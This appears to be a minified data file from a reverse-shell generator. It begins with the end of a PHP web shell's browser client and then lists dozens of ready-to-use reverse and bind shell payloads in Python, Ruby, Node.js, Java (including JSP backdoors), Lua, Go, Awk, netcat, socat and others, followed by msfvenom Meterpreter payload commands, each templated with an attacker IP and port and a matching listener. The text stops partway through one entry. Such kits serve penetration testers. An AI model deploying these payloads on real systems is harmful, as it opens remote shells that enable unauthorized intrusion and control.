                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\r
                            _insertStdout(atob(response.stdout));\r
                            updateCwd(atob(response.cwd));\r
                        });\r
                    }, function () {\r
                        _insertStdout('An unknown client-side error occurred.');\r
                    });\r
                });\r
                element.click();\r
                document.body.removeChild(element);\r
            }\r
\r
            function getBase64(file, onLoadCallback) {\r
                return new Promise(function(resolve, reject) {\r
                    var reader = new FileReader();\r
                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\r
                    reader.onerror = reject;\r
                    reader.readAsDataURL(file);\r
                });\r
            }\r
\r
            function genPrompt(cwd) {\r
                cwd = cwd || "~";\r
                var shortCwd = cwd;\r
                if (cwd.split("/").length > 3) {\r
                    var splittedCwd = cwd.split("/");\r
                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];\r
                }\r
                return SHELL_CONFIG["username"] + "@" + SHELL_CONFIG["hostname"] + ":<span title=\\"" + cwd + "\\">" + shortCwd + "</span>#";\r
            }\r
\r
            function updateCwd(cwd) {\r
                if (cwd) {\r
                    CWD = cwd;\r
                    _updatePrompt();\r
                    return;\r
                }\r
                makeRequest("?feature=pwd", {}, function(response) {\r
                    CWD = atob(response.cwd);\r
                    _updatePrompt();\r
                });\r
\r
            }\r
\r
            function escapeHtml(string) {\r
                return string\r
                    .replace(/&/g, "&amp;")\r
                    .replace(/</g, "&lt;")\r
                    .replace(/>/g, "&gt;");\r
            }\r
\r
            function _updatePrompt() {\r
                var eShellPrompt = document.getElementById("shell-prompt");\r
                eShellPrompt.innerHTML = genPrompt(CWD);\r
            }\r
\r
            function _onShellCmdKeyDown(event) {\r
                switch (event.key) {\r
                    case "Enter":\r
                        featureShell(eShellCmdInput.value);\r
                        insertToHistory(eShellCmdInput.value);\r
                        eShellCmdInput.value = "";\r
                        break;\r
                    case "ArrowUp":\r
                        if (historyPosition > 0) {\r
                            historyPosition--;\r
                            eShellCmdInput.blur();\r
                            eShellCmdInput.value = commandHistory[historyPosition];\r
                            _defer(function() {\r
                                eShellCmdInput.focus();\r
                            });\r
                        }\r
                        break;\r
                    case "ArrowDown":\r
                        if (historyPosition >= commandHistory.length) {\r
                            break;\r
                        }\r
                        historyPosition++;\r
                        if (historyPosition === commandHistory.length) {\r
                            eShellCmdInput.value = "";\r
                        } else {\r
                            eShellCmdInput.blur();\r
                            eShellCmdInput.focus();\r
                            eShellCmdInput.value = commandHistory[historyPosition];\r
                        }\r
                        break;\r
                    case 'Tab':\r
                        event.preventDefault();\r
                        featureHint();\r
                        break;\r
                }\r
            }\r
\r
            function insertToHistory(cmd) {\r
                commandHistory.push(cmd);\r
                historyPosition = commandHistory.length;\r
            }\r
\r
            function makeRequest(url, params, callback) {\r
                function getQueryString() {\r
                    var a = [];\r
                    for (var key in params) {\r
                        if (params.hasOwnProperty(key)) {\r
                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));\r
                        }\r
                    }\r
                    return a.join("&");\r
                }\r
                var xhr = new XMLHttpRequest();\r
                xhr.open("POST", url, true);\r
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\r
                xhr.onreadystatechange = function() {\r
                    if (xhr.readyState === 4 && xhr.status === 200) {\r
                        try {\r
                            var responseJson = JSON.parse(xhr.responseText);\r
                            callback(responseJson);\r
                        } catch (error) {\r
                            alert("Error while parsing response: " + error);\r
                        }\r
                    }\r
                };\r
                xhr.send(getQueryString());\r
            }\r
\r
            document.onclick = function(event) {\r
                event = event || window.event;\r
                var selection = window.getSelection();\r
                var target = event.target || event.srcElement;\r
\r
                if (target.tagName === "SELECT") {\r
                    return;\r
                }\r
\r
                if (!selection.toString()) {\r
                    eShellCmdInput.focus();\r
                }\r
            };\r
\r
            window.onload = function() {\r
                eShellCmdInput = document.getElementById("shell-cmd");\r
                eShellContent = document.getElementById("shell-content");\r
                updateCwd();\r
                eShellCmdInput.focus();\r
            };\r
        <\/script>\r
    </head>\r
\r
    <body>\r
        <div id="shell">\r
            <pre id="shell-content">\r
                <div id="shell-logo">\r
        ___                         ____      _          _ _        _  _   <span></span>\r
 _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\r
| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _\` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\r
| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\r
| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\r
|_|                         |___/  \\____/                                  <span></span>\r
                </div>\r
            </pre>\r
            <div id="shell-input">\r
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>\r
                <div>\r
                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>\r
                </div>\r
            </div>\r
        </div>\r
    </body>\r
\r
</html>`,listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!0},{id:"rev-python-1",name:"Python #1",category:"Reverse",language:"Python",platform:"Linux",command:`export RHOST="{ip}";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")'`,listener:"nc -lvnp {port}",notes:"",extension:".py",isFullScript:!1},{id:"rev-python-2",name:"Python #2",category:"Reverse",language:"Python",platform:"Linux",command:`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{shell}")'`,listener:"nc -lvnp {port}",notes:"",extension:".py",isFullScript:!1},{id:"rev-python3-1",name:"Python3 #1",category:"Reverse",language:"Python",platform:"Linux",command:`export RHOST="{ip}";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")'`,listener:"nc -lvnp {port}",notes:"",extension:".py",isFullScript:!1},{id:"rev-python3-2",name:"Python3 #2",category:"Reverse",language:"Python",platform:"Linux",command:`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{shell}")'`,listener:"nc -lvnp {port}",notes:"",extension:".py",isFullScript:!1},{id:"rev-python3-windows",name:"Python3 Windows",category:"Reverse",language:"Python",platform:"Windows",command:`import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))

p=subprocess.Popen(["{shell}"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()`,listener:"nc -lvnp {port}",notes:"",extension:".py",isFullScript:!0},{id:"rev-python3-shortest",name:"Python3 shortest",category:"Reverse",language:"Python",platform:"Linux",command:`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")'`,listener:"nc -lvnp {port}",notes:"",extension:".py",isFullScript:!1},{id:"rev-ruby-1",name:"Ruby #1",category:"Reverse",language:"Ruby",platform:"Linux",command:`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))'`,listener:"nc -lvnp {port}",notes:"",extension:".rb",isFullScript:!1},{id:"rev-ruby-no-sh",name:"Ruby no sh",category:"Reverse",language:"Ruby",platform:"Linux",command:`ruby -rsocket -e'exit if fork;c=TCPSocket.new("{ip}","{port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'`,listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!1},{id:"rev-socat-1",name:"socat #1",category:"Reverse",language:"Socat",platform:"Linux",command:"socat TCP:{ip}:{port} EXEC:{shell}",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-socat-2-tty",name:"socat #2 (TTY)",category:"Reverse",language:"Socat",platform:"Linux",command:"socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane",listener:"socat file:`tty`,raw,echo=0 TCP-L:{port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-sqlite3-nc-mkfifo",name:"sqlite3 nc mkfifo",category:"Reverse",language:"Netcat",platform:"Linux",command:"sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-node-js",name:"node.js",category:"Reverse",language:"NodeJS",platform:"Linux",command:"require('child_process').exec('nc -e {shell} {ip} {port}')",listener:"nc -lvnp {port}",notes:"",extension:".js",isFullScript:!1},{id:"rev-node-js-2",name:"node.js #2",category:"Reverse",language:"NodeJS",platform:"Both",command:`(function(){\r
    var net = require("net"),\r
        cp = require("child_process"),\r
        sh = cp.spawn("{shell}", []);\r
    var client = new net.Socket();\r
    client.connect({port}, "{ip}", function(){\r
        client.pipe(sh.stdin);\r
        sh.stdout.pipe(client);\r
        sh.stderr.pipe(client);\r
    });\r
    return /a/; // Prevents the Node.js application from crashing\r
})();`,listener:"nc -lvnp {port}",notes:"",extension:".js",isFullScript:!0},{id:"rev-java-1",name:"Java #1",category:"Reverse",language:"Java",platform:"Linux",command:`public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!0},{id:"rev-java-2",name:"Java #2",category:"Reverse",language:"Java",platform:"Linux",command:`public class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/{ip}/{port} 0>&1")
            .redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!0},{id:"rev-java-3",name:"Java #3",category:"Reverse",language:"Java",platform:"Both",command:`import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class shell {
    public static void main(String[] args) {
        String host = "{ip}";
        int port = {port};
        String cmd = "{shell}";
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
}`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!0},{id:"rev-java-web",name:"Java Web",category:"Reverse",language:"Java",platform:"Both",command:`<%@\r
page import="java.lang.*, java.util.*, java.io.*, java.net.*"\r
% >\r
<%!\r
static class StreamConnector extends Thread\r
{\r
        InputStream is;\r
        OutputStream os;\r
        StreamConnector(InputStream is, OutputStream os)\r
        {\r
                this.is = is;\r
                this.os = os;\r
        }\r
        public void run()\r
        {\r
                BufferedReader isr = null;\r
                BufferedWriter osw = null;\r
                try\r
                {\r
                        isr = new BufferedReader(new InputStreamReader(is));\r
                        osw = new BufferedWriter(new OutputStreamWriter(os));\r
                        char buffer[] = new char[8192];\r
                        int lenRead;\r
                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)\r
                        {\r
                                osw.write(buffer, 0, lenRead);\r
                                osw.flush();\r
                        }\r
                }\r
                catch (Exception ioe)\r
                try\r
                {\r
                        if(isr != null) isr.close();\r
                        if(osw != null) osw.close();\r
                }\r
                catch (Exception ioe)\r
        }\r
}\r
%>\r
\r
<h1>JSP Backdoor Reverse Shell</h1>\r
\r
<form method="post">\r
IP Address\r
<input type="text" name="ipaddress" size=30>\r
Port\r
<input type="text" name="port" size=10>\r
<input type="submit" name="Connect" value="Connect">\r
</form>\r
<p>\r
<hr>\r
\r
<%\r
String ipAddress = request.getParameter("ipaddress");\r
String ipPort = request.getParameter("port");\r
if(ipAddress != null && ipPort != null)\r
{\r
        Socket sock = null;\r
        try\r
        {\r
                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());\r
                Runtime rt = Runtime.getRuntime();\r
                Process proc = rt.exec("cmd.exe");\r
                StreamConnector outputConnector =\r
                        new StreamConnector(proc.getInputStream(),\r
                                          sock.getOutputStream());\r
                StreamConnector inputConnector =\r
                        new StreamConnector(sock.getInputStream(),\r
                                          proc.getOutputStream());\r
                outputConnector.start();\r
                inputConnector.start();\r
        }\r
        catch(Exception e) \r
}\r
%>`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!0},{id:"rev-java-two-way",name:"Java Two Way",category:"Reverse",language:"Java",platform:"Both",command:`<%\r
    /*\r
     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.\r
     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.\r
     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing \r
     * the command specified in the HTML form). This is to avoid to keep it simple.\r
     */\r
%>\r
\r
<%@page import="java.lang.*"%>\r
<%@page import="java.io.*"%>\r
<%@page import="java.net.*"%>\r
<%@page import="java.util.*"%>\r
\r
<html>\r
<head>\r
    <title>jrshell</title>\r
</head>\r
<body>\r
<form METHOD="POST" NAME="myform" ACTION="">\r
    <input TYPE="text" NAME="shell">\r
    <input TYPE="submit" VALUE="Send">\r
</form>\r
<pre>\r
<%\r
    // Define the OS\r
    String shellPath = null;\r
    try\r
    {\r
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {\r
            shellPath = new String("/bin/sh");\r
        } else {\r
            shellPath = new String("cmd.exe");\r
        }\r
    } catch( Exception e ){}\r
    // INNER HTML PART\r
    if (request.getParameter("shell") != null) {\r
        out.println("Command: " + request.getParameter("shell") + "\\n<BR>");\r
        Process p;\r
        if (shellPath.equals("cmd.exe"))\r
            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));\r
        else\r
            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));\r
        OutputStream os = p.getOutputStream();\r
        InputStream in = p.getInputStream();\r
        DataInputStream dis = new DataInputStream(in);\r
        String disr = dis.readLine();\r
        while ( disr != null ) {\r
            out.println(disr);\r
            disr = dis.readLine();\r
        }\r
    }\r
    // TCP PORT PART\r
    class StreamConnector extends Thread\r
    {\r
        InputStream wz;\r
        OutputStream yr;\r
        StreamConnector( InputStream wz, OutputStream yr ) {\r
            this.wz = wz;\r
            this.yr = yr;\r
        }\r
        public void run()\r
        {\r
            BufferedReader r  = null;\r
            BufferedWriter w = null;\r
            try\r
            {\r
                r  = new BufferedReader(new InputStreamReader(wz));\r
                w = new BufferedWriter(new OutputStreamWriter(yr));\r
                char buffer[] = new char[8192];\r
                int length;\r
                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )\r
                {\r
                    w.write( buffer, 0, length );\r
                    w.flush();\r
                }\r
            } catch( Exception e ){}\r
            try\r
            {\r
                if( r != null )\r
                    r.close();\r
                if( w != null )\r
                    w.close();\r
            } catch( Exception e ){}\r
        }\r
    }\r
 \r
    try {\r
        Socket socket = new Socket( "{ip}", {port} ); // Replace with wanted ip and port\r
        Process process = Runtime.getRuntime().exec( shellPath );\r
        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();\r
        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();\r
        out.println("port opened on " + socket);\r
     } catch( Exception e ) {}\r
%>\r
</pre>\r
</body>\r
</html>`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!0},{id:"rev-javascript",name:"Javascript",category:"Reverse",language:"NodeJS",platform:"Both",command:`String command = "var host = '{ip}';" +\r
                       "var port = {port};" +\r
                       "var cmd = '{shell}';"+\r
                       "var s = new java.net.Socket(host, port);" +\r
                       "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+\r
                       "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+\r
                       "var po = p.getOutputStream(), so = s.getOutputStream();"+\r
                       "print ('Connected');"+\r
                       "while (!s.isClosed()) {"+\r
                       "    while (pi.available() > 0)"+\r
                       "        so.write(pi.read());"+\r
                       "    while (pe.available() > 0)"+\r
                       "        so.write(pe.read());"+\r
                       "    while (si.available() > 0)"+\r
                       "        po.write(si.read());"+\r
                       "    so.flush();"+\r
                       "    po.flush();"+\r
                       "    java.lang.Thread.sleep(50);"+\r
                       "    try {"+\r
                       "        p.exitValue();"+\r
                       "        break;"+\r
                       "    }"+\r
                       "    catch (e) {"+\r
                       "    }"+\r
                       "}"+\r
                       "p.destroy();"+\r
                       "s.close();";\r
String x = "\\"\\".getClass().forName(\\"javax.script.ScriptEngineManager\\").newInstance().getEngineByName(\\"JavaScript\\").eval(\\""+command+"\\")";\r
ref.add(new StringRefAddr("x", x);`,listener:"nc -lvnp {port}",notes:"",extension:".js",isFullScript:!0},{id:"rev-groovy",name:"Groovy",category:"Reverse",language:"Groovy",platform:"Windows",command:'String host="{ip}";int port={port};String cmd="{shell}";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();',listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-telnet",name:"telnet",category:"Reverse",language:"cURL / Telnet",platform:"Linux",command:"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-zsh",name:"zsh",category:"Reverse",language:"Zsh",platform:"Linux",command:"zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!1},{id:"rev-lua-1",name:"Lua #1",category:"Reverse",language:"Lua",platform:"Linux",command:`lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');"`,listener:"nc -lvnp {port}",notes:"",extension:".lua",isFullScript:!1},{id:"rev-lua-2",name:"Lua #2",category:"Reverse",language:"Lua",platform:"Both",command:`lua5.1 -e 'local host, port = "{ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'`,listener:"nc -lvnp {port}",notes:"",extension:".lua",isFullScript:!1},{id:"rev-golang",name:"Golang",category:"Reverse",language:"Golang",platform:"Both",command:`echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("{shell}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`,listener:"nc -lvnp {port}",notes:"",extension:".go",isFullScript:!1},{id:"rev-vlang",name:"Vlang",category:"Reverse",language:"Vlang",platform:"Linux",command:`echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e {shell} {ip} {port} 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-awk",name:"Awk",category:"Reverse",language:"Awk",platform:"Linux",command:`awk 'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-dart",name:"Dart",category:"Reverse",language:"Dart",platform:"Both",command:`import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("{ip}", {port}).then((socket) {
    socket.listen((data) {
      Process.start('{shell}', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!0},{id:"rev-crystal-system",name:"Crystal (system)",category:"Reverse",language:"Crystal",platform:"Both",command:`crystal eval 'require "process";require "socket";c=Socket.tcp(Socket::Family::INET);c.connect("{ip}",{port});loop{m,l=c.receive;p=Process.new(m.rstrip("\\n"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-crystal-code",name:"Crystal (code)",category:"Reverse",language:"Crystal",platform:"Linux",command:`require "process"
require "socket"

c = Socket.tcp(Socket::Family::INET)
c.connect("{ip}", {port})
loop do 
  m, l = c.receive
  p = Process.new(m.rstrip("\\n"), output:Process::Redirect::Pipe, shell:true)
  c << p.output.gets_to_end
end`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!0},{id:"bind-nc-e-bind",name:"nc -e Bind",category:"Bind",language:"Netcat",platform:"Linux",command:"nc -nlvp {port} -e /bin/sh",listener:"nc -nv {ip} {port}",notes:"Attacker connects to listening target port via netcat.",extension:".txt",isFullScript:!1},{id:"bind-nc-exe-e-bind",name:"nc.exe -e Bind",category:"Bind",language:"Netcat",platform:"Windows",command:"nc.exe -nlvp {port} -e cmd",listener:"nc -nv {ip} {port}",notes:"Attacker connects to listening target port via netcat.",extension:".txt",isFullScript:!1},{id:"bind-nc-mkfifo-bind",name:"nc mkfifo Bind",category:"Bind",language:"Netcat",platform:"Linux",command:"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f",listener:"nc -nv {ip} {port}",notes:"Attacker connects to listening target port via netcat.",extension:".txt",isFullScript:!1},{id:"bind-ncat-e-bind",name:"ncat -e Bind",category:"Bind",language:"Netcat",platform:"Linux",command:"ncat -nlvp {port} -e /bin/sh",listener:"nc -nv {ip} {port}",notes:"Attacker connects to listening target port via netcat.",extension:".txt",isFullScript:!1},{id:"bind-perl-bind",name:"Perl Bind",category:"Bind",language:"Perl",platform:"Linux",command:`perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");};'`,listener:"nc -nv {ip} {port}",notes:"Attacker connects to listening target port via netcat.",extension:".pl",isFullScript:!1},{id:"bind-php-bind",name:"PHP Bind",category:"Bind",language:"PHP",platform:"Both",command:`php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{port});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'`,listener:"nc -nv {ip} {port}",notes:"Attacker connects to listening target port via netcat.",extension:".php",isFullScript:!1},{id:"bind-python3-bind",name:"Python3 Bind",category:"Bind",language:"Python",platform:"Both",command:`python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",{port}));s1.listen(1);c,a=s1.accept();
while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`,listener:"nc -nv {ip} {port}",notes:"Attacker connects to listening target port via netcat.",extension:".py",isFullScript:!1},{id:"bind-ruby-bind",name:"Ruby Bind",category:"Bind",language:"Ruby",platform:"Linux",command:`ruby -rsocket -e 'f=TCPServer.new(9001); s=f.accept; [0,1,2].each { |fd| IO.new(fd).reopen(s) }; exec "/bin/sh -i"'`,listener:"nc -nv {ip} {port}",notes:"Attacker connects to listening target port via netcat.",extension:".rb",isFullScript:!1},{id:"bind-socat-tty-bind",name:"Socat (TTY) Bind",category:"Bind",language:"Socat",platform:"Linux",command:"socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",listener:"socat file:`tty`,raw,echo=0 TCP-L:{port}",notes:"Attacker connects to listening target port via netcat.",extension:".txt",isFullScript:!1},{id:"msf-windows-meterpreter-staged-reverse-tcp-x64",name:"Windows Meterpreter Staged Reverse TCP (x64)",category:"MSFVenom",language:"Windows",platform:"Windows",command:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-windows-meterpreter-stageless-reverse-tcp-x64",name:"Windows Meterpreter Stageless Reverse TCP (x64)",category:"MSFVenom",language:"Windows",platform:"Windows",command:"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-windows-staged-reverse-tcp-x64",name:"Windows Staged Reverse TCP (x64)",category:"MSFVenom",language:"Windows",platform:"Windows",command:"msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-windows-stageless-reverse-tcp-x64",name:"Windows Stageless Reverse TCP (x64)",category:"MSFVenom",language:"Windows",platform:"Windows",command:"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-windows-staged-jsp-reverse-tcp",name:"Windows Staged JSP Reverse TCP",category:"MSFVenom",language:"Java",platform:"Windows",command:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f jsp -o ./rev.jsp",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-windows-staged-aspx-reverse-tcp",name:"Windows Staged ASPX Reverse TCP",category:"MSFVenom",language:"Windows",platform:"Windows",command:"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-windows-staged-aspx-reverse-tcp-x64",name:"Windows Staged ASPX Reverse TCP (x64)",category:"MSFVenom",language:"Windows",platform:"Windows",command:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",listener:"nc -lvnp {port}",notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-linux-meterpreter-staged-reverse-tcp-x64",name:"Linux Meterpreter Staged Reverse TCP (x64)",category:"MSFVenom",language:"Linux",platform:"Linux",command:"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",listener:'msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST {ip}; set LPORT {port}; run"',notes:"Generate staged or stageless Metasploit binary payload.",extension:".sh",isFullScript:!1},{id:"msf-linux-stageless-reverse-tcp-x64",name:"Linux Stageless Reverse TCP (x64)",category:"MSFVenom",language:"Linux",platform:"Linux",command:"msfvenom -p 